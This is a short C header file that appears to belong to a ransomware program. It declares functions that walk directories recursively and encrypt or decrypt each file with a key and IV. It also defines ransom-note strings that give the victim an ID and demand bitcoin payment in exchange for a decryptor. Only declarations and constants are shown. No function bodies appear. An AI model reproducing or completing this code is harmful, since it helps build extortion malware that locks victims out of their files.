#ifndef FILERECURSOR_H
#define FILERECURSOR_H

#include <errno.h>
#include <sys/dir.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "encrypt.h"


/*preprocessor*/
void directory_handle(char * name,unsigned char * key, unsigned char * iv, char * id,int mode);
void file_handler(char * filepath, char * filename,unsigned char * key, unsigned char * iv,int mode);
void startRecursion(char * start,unsigned char * key, unsigned char * iv,char * id, int mode);
char *get_filename_ext(const char *filename);

#define NOTE1 "RESPECT MY AUTHORITAH!! \n FOR REAL THOUGH... \n Your id is "
#define NOTE2 "\n Pay up bitcoins then run my decrypt program"
#define ENCRYPT 0
#define DECRYPT 1

#endif

